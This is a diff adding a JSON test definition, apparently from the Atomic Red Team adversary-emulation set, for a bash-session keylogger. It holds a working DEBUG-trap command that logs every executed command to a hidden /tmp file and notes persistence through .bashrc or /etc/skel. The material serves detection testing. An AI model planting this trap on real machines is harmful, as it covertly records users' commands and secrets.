@@ -1,0 +1,105 @@
+{
+  "id": "7f85a946-a0ea-48aa-b6ac-8ff539278258",
+  "name": "Bash session based keylogger",
+  "description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "ceee5c8f-061f-4ae7-bb5a-c7914481287c",
+      "type": "execute-command",
+      "data": {
+        "command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" \u003e\u003e #{output_file}' DEBUG\necho \"Hello World!\"\ncat #{output_file}\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "0e35725a-36a2-4c7c-b379-98e4711885bc",
+      "type": "execute-command",
+      "data": {
+        "command": "rm #{output_file}\n",
+        "command_type": "bash"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8462ade8-6385-4976-a1b7-2dd0c86c3c91",
+      "name": "Check dependency 1/1",
+      "description": "This test requires to be run in a bash shell\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8ab1740a-6bdc-44ee-a778-3e1beee90058",
+      "name": "Resolve dependency 1/1",
+      "description": "This test requires to be run in a bash shell\n",
+      "type": "execute-command",
+      "data": {
+        "command": "echo \"\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f8e1fe7f-422c-4bb9-a71e-d7d617fa8178",
+      "name": "Re-check dependency 1/1",
+      "description": "This test requires to be run in a bash shell\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ceee5c8f-061f-4ae7-bb5a-c7914481287c",
+      "p": "on-success",
+      "o": "0e35725a-36a2-4c7c-b379-98e4711885bc"
+    },
+    {
+      "s": "ceee5c8f-061f-4ae7-bb5a-c7914481287c",
+      "p": "on-failure",
+      "o": "0e35725a-36a2-4c7c-b379-98e4711885bc"
+    },
+    {
+      "s": "8462ade8-6385-4976-a1b7-2dd0c86c3c91",
+      "p": "on-success",
+      "o": "ceee5c8f-061f-4ae7-bb5a-c7914481287c"
+    },
+    {
+      "s": "8462ade8-6385-4976-a1b7-2dd0c86c3c91",
+      "p": "on-failure",
+      "o": "8ab1740a-6bdc-44ee-a778-3e1beee90058"
+    },
+    {
+      "s": "8ab1740a-6bdc-44ee-a778-3e1beee90058",
+      "p": "on-success",
+      "o": "f8e1fe7f-422c-4bb9-a71e-d7d617fa8178"
+    },
+    {
+      "s": "f8e1fe7f-422c-4bb9-a71e-d7d617fa8178",
+      "p": "on-failure",
+      "o": "ceee5c8f-061f-4ae7-bb5a-c7914481287c"
+    }
+  ],
+  "tags": [
+    "T1056.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "output_file",
+      "type": "string",
+      "description": "File to store captured commands",
+      "value": "/tmp/.keyboard.log"
+    }
+  ]
+}
